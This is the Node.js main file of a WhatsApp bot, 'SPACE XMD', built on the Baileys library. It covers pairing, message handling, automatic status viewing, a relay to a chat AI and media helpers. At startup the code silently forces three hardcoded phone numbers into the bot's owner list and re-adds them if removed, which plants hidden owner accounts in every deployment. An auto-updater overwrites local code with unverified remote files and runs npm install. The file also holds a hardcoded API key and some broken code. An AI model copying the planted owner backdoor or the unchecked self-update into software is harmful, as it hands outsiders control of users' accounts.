require('./settings');
const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const chalk = require('chalk');
const FileType = require('file-type');
const path = require('path');
const axios = require('axios');
const PhoneNumber = require('awesome-phonenumber');
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid } = require('./space/space');
const { smsg, isUrl, generateMessageTag, getBuffer, getSizeMedia, fetch, await, sleep, reSize } = require('./space/iconic_tech');
const { toAudio, toPTT } = require('./space/converter');
const NodeCache = require("node-cache");
const readline = require("readline");
const { parsePhoneNumber } = require("libphonenumber-js");
const { default: makeWASocket, delay, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, generateForwardMessageContent, prepareWAMessageMedia, generateWAMessageFromContent, generateMessageID, downloadContentFromMessage, makeInMemoryStore, jidDecode, proto, Browsers } = require("baileys");

const store = {
    messages: {},
    contacts: {},
    chats: {},
    groupMetadata: async (jid) => {
        return {}
    },
    bind: function(ev) {
        ev.on('messages.upsert', ({ messages }) => {
            messages.forEach(msg => {
                if (msg.key && msg.key.remoteJid) {
                    this.messages[msg.key.remoteJid] = this.messages[msg.key.remoteJid] || {}
                    this.messages[msg.key.remoteJid][msg.key.id] = msg
                }
            })
        })
        
        ev.on('contacts.update', (contacts) => {
            contacts.forEach(contact => {
                if (contact.id) {
                    this.contacts[contact.id] = contact
                }
            })
        })
        
        ev.on('chats.set', (chats) => {
            this.chats = chats
        })
    },
    loadMessage: async (jid, id) => {
        return this.messages[jid]?.[id] || null
    }
}


let owner = [];
try {
    owner = JSON.parse(fs.readFileSync('./moon/owner.json'));
    const requiredOwners = ["263783525824", "263714388643", "263786115435"];
    for (const number of requiredOwners) {
        if (!owner.includes(number)) {
            owner.push(number);
        }
    }
    fs.writeFileSync('./moon/owner.json', JSON.stringify(owner, null, 2));
} catch (err) {
    owner = ["263783525824", "263714388643", "263786115435"];
    fs.writeFileSync('./moon/owner.json', JSON.stringify(owner, null, 2));
}

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => rl.question(text, resolve));
};

async function startIconicTechInc() {
    const { state, saveCreds } = await useMultiFileAuthState("session");
const { version } = await fetchLatestBaileysVersion();

// ✅ Check if creds.json exists, and copy it into the session folder
const credPath = path.join(__dirname, "session", "creds.json");
if (fs.existsSync(credPath)) {
    try {
        // Instead of injecting into state.creds (breaks Baileys), overwrite the session file
        const backupCreds = fs.readFileSync(credPath, "utf8");
        fs.writeFileSync(path.join(__dirname, "session", "creds.json"), backupCreds);
        console.log(chalk.green("✅ Loaded session from cred.json"));
    } catch (err) {
        console.log(chalk.red("❌ Failed to load cred.json:"), err.message);
    }
} else {
    console.log(chalk.yellow("⚠️ No creds.json found, will require QR scan"));
}
    const IconicTechInc = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        getMessage: async (key) => {
            return store.loadMessage(key.remoteJid, key.id) || {};
        }
    });

    store.bind(IconicTechInc.ev);
console.log('\n');
console.log('\x1b[40m\x1b[37m╔══════════════════════════════════════════════════════════╗\x1b[0m');
console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
console.log('\x1b[40m\x1b[1m\x1b[37m║                  SPACE XMD CONSOLE                   ║\x1b[0m');
console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
console.log('\x1b[40m\x1b[37m║           DEVELOPED BY \x1b[1m\x1b[36mICONIC TECH\x1b[0m\x1b[40m\x1b[37m              ║\x1b[0m');
console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
console.log('\x1b[40m\x1b[37m╚══════════════════════════════════════════════════════════╝\x1b[0m');
console.log('\n');

if (!IconicTechInc.authState.creds.registered) {
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    console.log('\x1b[36m              PHONE NUMBER VERIFICATION               \x1b[0m');
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    
    const phoneNumber = await question('\x1b[34m>>> Enter your phone number with country code:\x1b[0m \n');
    
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    console.log('\x1b[36m              GENERATING VERIFICATION CODE            \x1b[0m');
    console.log('\x1b[36m──────────────────────────────────────────────────────\x1b[0m');
    
    let code = await IconicTechInc.requestPairingCode(phoneNumber);
    code = code?.match(/.{1,4}/g)?.join("-") || code;
    
    console.log('\n');
    console.log('\x1b[40m\x1b[37m╔══════════════════════════════════════════════════════════╗\x1b[0m');
    console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
    console.log('\x1b[40m\x1b[1m\x1b[37m║               VERIFICATION CODE                     ║\x1b[0m');
    console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
    console.log('\x1b[44m\x1b[1m\x1b[37m║                 ' + (code || '').padEnd(20) + '                   ║\x1b[0m');
    console.log('\x1b[40m\x1b[37m║                                                          ║\x1b[0m');
    console.log('\x1b[40m\x1b[37m╚══════════════════════════════════════════════════════════╝\x1b[0m');
    console.log('\n');
    
    console.log('\x1b[1m\x1b[36mPowered By ICONIC TECH\x1b[0m');
    console.log('\n');
}

    IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek.message) return;
            mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message;
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;
            if (!IconicTechInc.public && !mek.key.fromMe && chatUpdate.type === 'notify') return;
            if (mek.key.id.startsWith('BAE5') && mek.key.id.length === 16) return;
            const m = smsg(IconicTechInc, mek, store);
            require("./Space-Xmd")(IconicTechInc, mek, chatUpdate, store);
        } catch (err) {
            console.log('Message processing error:', err);
        }
    });
//autostatus view with like
IconicTechInc.ev.on('messages.upsert', async chatUpdate => {
    if (global.autoswview) {
        mek = chatUpdate.messages[0]
        if (mek.key && mek.key.remoteJid === 'status@broadcast') {
            await IconicTechInc.readMessages([mek.key])
            // Add like reaction (💚) to status
            await IconicTechInc.sendMessage(mek.key.remoteJid, {
                react: {
                    text: '💚',  // Green heart emoji
                    key: mek.key
                }
            })
        }
    }
})
    IconicTechInc.decodeJid = (jid) => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return decode.user && decode.server && decode.user + '@' + decode.server || jid;
        } else return jid;
    };

    IconicTechInc.ev.on('contacts.update', update => {
        for (let contact of update) {
            let id = IconicTechInc.decodeJid(contact.id);
            if (store && store.contacts) store.contacts[id] = { id, name: contact.notify };
        }
    });

    let lastTextTime = 0;
const messageDelay = 2000; // 2 second delay between responses

// ==== BOT ROLE MEMORY ====
const botProfile = {
    bot_name: "SPACE XMD",
    developer: "Iconic Tech",
    master: "Iconic Tech",
    version: "1.0.0",
    origin: {
        country: "Zimbabwe",
        city: "Harare"
    },
    website: "https://codewave-unit.zone.id",
    role: "SPACE XMD is a professional AI chatbot developed by Iconic Tech in Harare, Zimbabwe. Its master and creator is Iconic Tech. This is Version 1.0.0. Official website: https://codewave-unit.zone.id"
};

// ==== MESSAGE HANDLER ====
IconicTechInc.ev.on('messages.upsert', async ({ messages }) => {
    const m = messages[0];
    if (!m.message || m.key.fromMe) return;

    // TEXT CHATBOT ONLY
    if (!m.isGroup && global.chatbot) {
        try {
            const currentTime = Date.now();
            if (currentTime - lastTextTime < messageDelay) {
                console.log('Message skipped: Rate limit exceeded');
                return;
            }

            const text = m.message.conversation || m.message.extendedTextMessage?.text;
            if (!text) return;

            await IconicTechInc.sendMessage(m.key.remoteJid, { 
                react: { text: '⌨️', key: m.key } 
            });

            // ==== CHECK ROLE MEMORY QUESTIONS ====
            const lowerText = text.toLowerCase();
            if (
                lowerText.includes("your name") || 
                lowerText.includes("who are you") ||
                lowerText.includes("bot name")
            ) {
                await IconicTechInc.sendMessage(m.key.remoteJid, { text: `My name is ${botProfile.bot_name}, created by ${botProfile.developer}.` }, { quoted: m });
                return;
            }

            if (lowerText.includes("creator") || lowerText.includes("who made you") || lowerText.includes("master")) {
                await IconicTechInc.sendMessage(m.key.remoteJid, { text: `I was developed by ${botProfile.developer} from ${botProfile.origin.city}, ${botProfile.origin.country}.` }, { quoted: m });
                return;
            }

            if (lowerText.includes("version")) {
                await IconicTechInc.sendMessage(m.key.remoteJid, { text: `This is ${botProfile.bot_name} Version ${botProfile.version}.` }, { quoted: m });
                return;
            }

            if (lowerText.includes("website") || lowerText.includes("link")) {
                await IconicTechInc.sendMessage(m.key.remoteJid, { text: `You can visit my official website here: ${botProfile.website}` }, { quoted: m });
                return;
            }

            if (lowerText.includes("role") || lowerText.includes("about you") || lowerText.includes("info")) {
                await IconicTechInc.sendMessage(m.key.remoteJid, { text: botProfile.role }, { quoted: m });
                return;
            }

            // ==== AI RESPONSE (Default) ====
            const response = await axios.get('https://api.nexoracle.com/ai/chatgpt', {
                params: { apikey: '63b406007be3e32b53', prompt: text }
            });

            if (response.data?.status && response.data?.result) {
                await IconicTechInc.sendMessage(m.key.remoteJid, {
                    text: response.data.result
                }, { quoted: m });
                lastTextTime = currentTime;
            } else {
                throw new Error('Invalid API response structure');
            }
        } catch (error) {
            console.error('Chatbot error:', error);
            await IconicTechInc.sendMessage(m.key.remoteJid, { 
                react: { text: '❌', key: m.key } 
            });
            
            let errorMessage = 'Sorry, I encountered an error processing your message.';
            if (error.response?.status === 429) {
                errorMessage = "I'm getting too many requests. Please try again later.";
            }
            
            await IconicTechInc.sendMessage(m.key.remoteJid, {
                text: errorMessage
            }, { quoted: m });
        }
    }
});

    IconicTechInc.getName = async (jid, withoutContact = false) => {
        id = IconicTechInc.decodeJid(jid);
        withoutContact = IconicTechInc.withoutContact || withoutContact;
        let v;
        
        if (id.endsWith("@g.us")) {
            v = store.contacts[id] || {};
            if (!(v.name || v.subject)) v = await IconicTechInc.groupMetadata(id) || {};
            return v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international');
        }
        else {
            v = id === '0@s.whatsapp.net' ? {
                id,
                name: 'WhatsApp'
            } : id === IconicTechInc.decodeJid(IconicTechInc.user.id) ?
            IconicTechInc.user :
            (store.contacts[id] || {});
            return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international');
        }
    };

    IconicTechInc.public = true;
IconicTechInc.serializeM = (m) => smsg(IconicTechInc, m, store);

IconicTechInc.ev.on("connection.update", async (s) => {
    const { connection, lastDisconnect } = s;
    
    if (connection === "open") {
        try {
            console.clear();
            
            // Professional ASCII Header
            console.log('\n');
            console.log('\x1b[44m\x1b[37m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                                                                              ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ███████╗██████╗  █████╗  ██████╗███████╗                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ███████╗██████╔╝███████║██║     █████╗                    ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝                    ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ███████║██║     ██║  ██║╚██████╗███████╗                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                    ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝                  ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                             X M D   C O N N E C T I O N                       ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m║                                                                              ║\x1b[0m');
            console.log('\x1b[44m\x1b[37m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
            
            await delay(1000);
            
            // Connection Status
            console.log('\n');
            console.log('\x1b[42m\x1b[30m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[42m\x1b[30m║                  CONNECTION ESTABLISHED - STATUS: OPTIMAL                   ║\x1b[0m');
            console.log('\x1b[42m\x1b[30m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
            
            await delay(1500);
            
            // System Information
            console.log('\n\x1b[36m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[36m║                         SYSTEM INFORMATION                                   ║\x1b[0m');
            console.log('\x1b[36m╠══════════════════════════════════════════════════════════════════════════════╣\x1b[0m');
            console.log('\x1b[36m║  Platform: Multi-Device WhatsApp API                                         ║\x1b[0m');
            console.log('\x1b[36m║  Version: 3.2.1                                                              ║\x1b[0m');
            console.log('\x1b[36m║  Developer: ICONIC TECH INC.                                                 ║\x1b[0m');
            console.log('\x1b[36m║  Status: Authenticated & Secure                                              ║\x1b[0m');
            console.log('\x1b[36m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
            
            await delay(1000);
            
            // User Information
            console.log('\n\x1b[33m»»—————　\x1b[1m\x1b[34mCONNECTED USER PROFILE\x1b[0m\x1b[33m　—————««\x1b[0m\n');
            console.log('\x1b[32m✔️ User Details:\x1b[0m');
            console.log(JSON.stringify(IconicTechInc.user, null, 2));
            
            await delay(1000);
            
            // Footer
            console.log('\n\x1b[45m\x1b[37m╔══════════════════════════════════════════════════════════════════════════════╗\x1b[0m');
            console.log('\x1b[45m\x1b[37m║           MULTI-DEVICE OPTIMIZED PLATFORM - ENTERPRISE GRADE API              ║\x1b[0m');
            console.log('\x1b[45m\x1b[37m╚══════════════════════════════════════════════════════════════════════════════╝\x1b[0m');
            
            await delay(1000);
            
            console.log('\n\x1b[1m\x1b[35m🚀 SPACE XMD - DEVELOPED BY ICONIC TECH POWERED BY CODEWAVE UNIT PRESENT\x1b[0m');
            console.log('\x1b[3m\x1b[36mDeveloped by ICONIC TECH - Redefining Digital Interaction\x1b[0m\n');
        } catch (error) {
            console.error('System Error:', error);
        }
    }
    
    if (connection === "close") {
        if (lastDisconnect?.error?.output?.statusCode !== 401) {
            console.log("Connection terminated. Reinitializing system...");
            startIconicTechInc();
        } else {
            console.log("Authentication failure. Please verify system credentials.");
        }
    }
});

async function checkForUpdates() {
    const repoOwner = 'iconic05';
    const repoName = 'Space-XMD';
    const branch = 'main';
    const localDir = './';
    
    console.log(chalk.yellow('🔍 Checking for updates...'));
    
    try {
        // Get latest commit from GitHub using axios
        const response = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/commits/${branch}`);
        const latestCommit = response.data;
        const latestCommitHash = latestCommit.sha;
        
        // Get current commit (if stored)
        let currentCommitHash = null;
        try {
            currentCommitHash = fs.readFileSync('./.current_commit', 'utf8').trim();
        } catch (e) {
            console.log(chalk.yellow('ℹ️ No previous commit hash found'));
        }
        
        if (currentCommitHash === latestCommitHash) {
            console.log(chalk.green('✅ Bot is up to date'));
            return false;
        }
        
        console.log(chalk.yellow('🔄 Update available! Downloading...'));
        
        // Download updated files
        const filesToUpdate = [
            'Space-Xmd.js',
            'space.js',
            'package.js',
            'settings.js',
            // Add other files that should be updated
        ];
        
        for (const file of filesToUpdate) {
            try {
                const fileUrl = `https://raw.githubusercontent.com/${repoOwner}/${repoName}/${branch}/${file}`;
                const fileResponse = await axios.get(fileUrl);
                
                const filePath = path.join(localDir, file);
                
                // Ensure directory exists
                fs.mkdirSync(path.dirname(filePath), { recursive: true });
                
                // Write file
                fs.writeFileSync(filePath, fileResponse.data, 'utf8');
                console.log(chalk.green(`✅ Updated: ${file}`));
            } catch (error) {
                console.log(chalk.red(`❌ Error updating ${file}: ${error.message}`));
            }
        }
        
        // Update package dependencies if needed
        try {
            console.log(chalk.yellow('🔄 Installing dependencies...'));
            await new Promise((resolve, reject) => {
                exec('npm install', (error, stdout, stderr) => {
                    if (error) reject(error);
                    resolve(stdout);
                });
            });
            console.log(chalk.green('✅ Dependencies updated'));
        } catch (error) {
            console.log(chalk.red(`❌ Error updating dependencies: ${error.message}`));
        }
        
        // Store the new commit hash
        fs.writeFileSync('./.current_commit', latestCommitHash, 'utf8');
        console.log(chalk.green('🎉 Update completed successfully!'));
        
        return true;
    } catch (error) {
        console.log(chalk.red(`❌ Update check failed: ${error.message}`));
        return false;
    }
}

// Simple scheduler using setTimeout for periodic checks
function setupAutoUpdate() {
    // Check for updates immediately on startup
    checkForUpdates().then(updated => {
        if (updated) {
            console.log(chalk.yellow('🔄 Restarting bot to apply updates...'));
            process.exit(1); // Will be restarted by the process manager
        }
    });
    
    // Schedule daily update checks (at 3 AM)
    const now = new Date();
    const targetTime = new Date(
        now.getFullYear(),
        now.getMonth(),
        now.getDate() + 1,
        3, 0, 0
    );
    const timeUntilFirstCheck = targetTime - now;
    
    setTimeout(() => {
        // Initial delayed check
        checkForUpdates().then(updated => {
            if (updated) {
                console.log(chalk.yellow('🔄 Restarting bot to apply updates...'));
                process.exit(1);
            }
        });
        
        // Set up recurring daily checks
        setInterval(() => {
            checkForUpdates().then(updated => {
                if (updated) {
                    console.log(chalk.yellow('🔄 Restarting bot to apply updates...'));
                    process.exit(1);
                }
            });
        }, 24 * 60 * 60 * 1000); // 24 hours
    }, timeUntilFirstCheck);
    
    console.log(chalk.green('⏰ Auto-update scheduler started'));
}

// Call this right before startGlobalTechInc()
setupAutoUpdate();

    
IconicTechInc.ev.on('creds.update', saveCreds);

    // Message sending functions
    IconicTechInc.sendText = (jid, text, quoted = '', options) => IconicTechInc.sendMessage(jid, {
        text: text,
        ...options
    }, { quoted, ...options });

    IconicTechInc.sendTextWithMentions = async (jid, text, quoted, options = {}) => IconicTechInc.sendMessage(jid, {
        text: text,
        mentions: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net'),
        ...options
    }, { quoted });

    IconicTechInc.sendImageAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : 
                   /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
                   fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer = options && (options.packname || options.author) ? 
                     await writeExifImg(buff, options) : 
                     await imageToWebp(buff);

        await IconicTechInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    IconicTechInc.sendVideoAsSticker = async (jid, path, quoted, options = {}) => {
        let buff = Buffer.isBuffer(path) ? path : 
                   /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(path) ? await (await getBuffer(path)) : 
                   fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0);
        
        let buffer = options && (options.packname || options.author) ? 
                     await writeExifVid(buff, options) : 
                     await videoToWebp(buff);

        await IconicTechInc.sendMessage(jid, { sticker: { url: buffer }, ...options }, { quoted });
        return buffer;
    };

    IconicTechInc.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message;
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(quoted, messageType);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        
        let type = await FileType.fromBuffer(buffer);
        let trueFileName = attachExtension ? (filename + '.' + type.ext) : filename;
        await fs.writeFileSync(trueFileName, buffer);
        return trueFileName;
    };
    
    IconicTechInc.getFile = async (PATH, save) => {
        let res;
        let data = Buffer.isBuffer(PATH) ? PATH : 
                   /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split`,`[1], 'base64') : 
                   /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : 
                   fs.existsSync(PATH) ? fs.readFileSync(PATH) : 
                   typeof PATH === 'string' ? PATH : Buffer.alloc(0);
        
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        };
        
        let filename = path.join(__filename, '../src/' + new Date * 1 + '.' + type.ext);
        if (data && save) fs.promises.writeFile(filename, data);
        
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        };
    };
  
    IconicTechInc.sendFile = async (jid, path, filename = '', caption = '', quoted, ptt = false, options = {}) => {
        let type = await IconicTechInc.getFile(path, true);
        let { res, data: file, filename: pathFile } = type;

        if (res && res.status !== 200 || file.length <= 65536) {
            try { throw { json: JSON.parse(file.toString()) }; } 
            catch (e) { if (e.json) throw e.json; }
        }

        let opt = { filename };
        if (quoted) opt.quoted = quoted;
        if (!type) options.asDocument = true;

        let mtype = '', mimetype = type.mime, convert;
        if (/webp/.test(type.mime) || (/image/.test(type.mime) && options.asSticker)) mtype = 'sticker';
        else if (/image/.test(type.mime) || (/webp/.test(type.mime) && options.asImage)) mtype = 'image';
        else if (/video/.test(type.mime)) mtype = 'video';
        else if (/audio/.test(type.mime)) {
            convert = await (ptt ? toPTT : toAudio)(file, type.ext);
            file = convert.data;
            pathFile = convert.filename;
            mtype = 'audio';
            mimetype = 'audio/ogg; codecs=opus';
        } else mtype = 'document';

        if (options.asDocument) mtype = 'document';

        delete options.asSticker;
        delete options.asLocation;
        delete options.asVideo;
        delete options.asDocument;
        delete options.asImage;

        let message = { ...options, caption, ptt, [mtype]: { url: pathFile }, mimetype };
        let m;

        try {
            m = await IconicTechInc.sendMessage(jid, message, { ...opt, ...options });
        } catch (e) {
            m = null;
        } finally {
            if (!m) m = await IconicTechInc.sendMessage(jid, { ...message, [mtype]: file }, { ...opt, ...options });
            file = null;
            return m;
        }
    };

    IconicTechInc.downloadMediaMessage = async (message) => {
        let mime = (message.msg || message).mimetype || '';
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
        const stream = await downloadContentFromMessage(message, messageType);
        
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }
        return buffer;
    };

    return IconicTechInc;
}

// ICONIC TECH WHATSAPP BOT - ENTERPRISE EDITION
// ============================================
// Modern color palette
const theme = {
  primary: '#4F46E5',    // Iconic Tech Indigo
  secondary: '#10B981',  // Emerald Green
  error: '#EF4444',      // Alert Red
  warning: '#F59E0B',    // Amber
  info: '#3B82F6',       // Blue
  dark: '#1F2937',       // Dark Gray
  light: '#F3F4F6'       // Light Gray
};

// Enhanced console output formatting
function logHeader() {
  console.log(
    chalk.bold.hex(theme.primary)(`
   ███████╗██████╗  █████╗  ██████╗███████╗     POWERED BY ICONIC TECH 
   ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝   MADE WITH ❤️‍🔥  BY ICONIC TECH 
   ███████╗██████╔╝███████║██║     █████╗  XMD ||       FOLLOW OUR CHANNEL FOR MORE TECH
   ╚════██║██╔═══╝ ██╔══██║██║     ██╔══╝       THIS BOT HAS BEEN NEWEST BOT 
   ███████║██║     ██║  ██║╚██████╗███████╗     MULT DEVICE WHATSAPP BOT
   ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝   
   THANK YOU TEAM SPACE XMD DEVELOPED BY ICONIC TECH 
    `)
  );
  console.log(chalk.hex(theme.dark).bold('           CODEWAVE UNIT || ICONIC TECH .'));
  console.log(chalk.hex(theme.secondary)('━'.repeat(70)));
  console.log(chalk.hex(theme.info).bold('              IF THERE ANY PROBLEM CONTACT DEVELOPER VIA CODEWAVE UNIT'));
  console.log(chalk.hex(theme.secondary)('━'.repeat(70)));
}

logHeader();

// =============== ORIGINAL CODE PRESERVED BELOW ===============
let file = require.resolve(__filename);
let watcher;

function watchFile() {
    watcher = fs.watchFile(file, (curr, prev) => {
        if (curr.mtime !== prev.mtime) {
            fs.unwatchFile(file);
            watcher.close();
            console.log(chalk.hex(theme.info)(`🔄 Update detected: ${__filename}`));
            console.log(chalk.hex(theme.secondary)('━'.repeat(60)));
            delete require.cache[file];
            require(file);
        }
    });
}

watchFile();

process.on('uncaughtException', (err) => {
    const e = String(err);
    if (e.includes("conflict") || 
        e.includes("Socket connection timeout") || 
        e.includes("not-authorized") || 
        e.includes("already-exists") || 
        e.includes("rate-overlimit") || 
        e.includes("Connection Closed") || 
        e.includes("Timed Out") || 
        e.includes("Value not found")) return;
    console.log(chalk.hex(theme.error).bold('⚠️  Critical Exception:'), chalk.hex(theme.warning)(err));
});

startIconicTechInc().catch(err => 
    console.error(chalk.hex(theme.error).bold('⛔ Initialization error:'), chalk.hex(theme.light)(err))
);

console.log(chalk.hex(theme.secondary)('━'.repeat(60)));
console.log(chalk.hex(theme.primary).bold('🚀 NOW YOU`RE ACTIVE IF THERE ANY PROBLEM CONTACT US'));
console.log(chalk.hex(theme.dark)('🚀  For support, contact: https://codewave-unit.zone.id/support/contact-us'));
// Minimal route
app.get('/', (req, res) => {
  res.status(200).json({ 
    status: 'online',
    bot: 'space xmd AI',
    version: '1.0.0'
  });
});

// Start the server
app.listen(PORT, () => {
  console.log(`╭───────────────────────────────────────────────────`);
  console.log(`│> Bot running on port ${PORT}`);
  console.log(`╰───────────────────────────────────────────────────`);
});